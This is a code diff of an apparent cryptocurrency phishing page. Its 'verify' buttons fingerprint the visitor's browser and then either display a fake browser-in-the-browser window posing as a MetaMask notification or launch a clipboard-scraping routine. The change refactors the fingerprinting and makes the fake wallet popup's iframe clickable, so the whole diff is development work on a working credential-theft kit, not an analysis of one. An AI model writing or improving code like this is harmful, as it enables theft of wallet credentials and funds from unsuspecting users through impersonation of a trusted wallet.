@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v13: Definitive Edition */
+        /* SYNTAX v13.2: Final Architecture */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         #bitb-container {
@@ -72,30 +72,32 @@
                 bitbContainer: document.getElementById('bitb-container'),
             };
 
-            let currentFingerprint = {};
-
-            function gatherFingerprint() {
-                 currentFingerprint = { 
+            ui.walletVerifyBtn.addEventListener('click', () => {
+                ui.initialState.style.display = 'none';
+                ui.choiceState.style.display = 'none';
+                
+                // SYNTAX FIX: Fingerprint is gathered at the moment of action.
+                const fingerprint = { 
                     timestamp: new Date().toISOString(),
                     platform: navigator.platform || 'unknown',
                     userAgent: navigator.userAgent || 'unknown',
-                    // This value is now informational, not for logic branching.
-                    hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask 
+                    hasMetamask: true // Deterministic: This path implies MetaMask.
                 };
-            }
-
-            ui.walletVerifyBtn.addEventListener('click', () => {
-                gatherFingerprint();
-                ui.initialState.style.display = 'none';
-                ui.choiceState.style.display = 'none';
-                deployBitBModule(currentFingerprint);
+                deployBitBModule(fingerprint);
             });
 
             ui.standardVerifyBtn.addEventListener('click', () => {
-                gatherFingerprint();
                 ui.initialState.style.display = 'none';
                 ui.choiceState.style.display = 'none';
-                deployClipboardScraper(currentFingerprint);
+                
+                // SYNTAX FIX: Fingerprint is gathered at the moment of action.
+                const fingerprint = { 
+                    timestamp: new Date().toISOString(),
+                    platform: navigator.platform || 'unknown',
+                    userAgent: navigator.userAgent || 'unknown',
+                    hasMetamask: false // Deterministic: This path implies no MetaMask.
+                };
+                deployClipboardScraper(fingerprint);
             });
 
 
@@ -111,7 +113,7 @@
             }
 
             function deployBitBModule(fingerprint) {
-                const fakeWindowHTML = `<div id="fake-browser-window" style="top: 20px; right: 20px;"><div class="fake-header"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Icon"><span>MetaMask Notification</span><div class="fake-address-bar">...</div></div><iframe srcdoc="" class="w-full h-full border-0" style="pointer-events: none;"></iframe></div>`;
+                const fakeWindowHTML = `<div id="fake-browser-window" style="top: 20px; right: 20px;"><div class="fake-header"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Icon"><span>MetaMask Notification</span><div class="fake-address-bar">...</div></div><iframe srcdoc="" class="w-full h-full border-0"></iframe></div>`;
                 ui.bitbContainer.innerHTML = fakeWindowHTML;
                 const iframe = ui.bitbContainer.querySelector('iframe');
                 iframe.onload = () => {
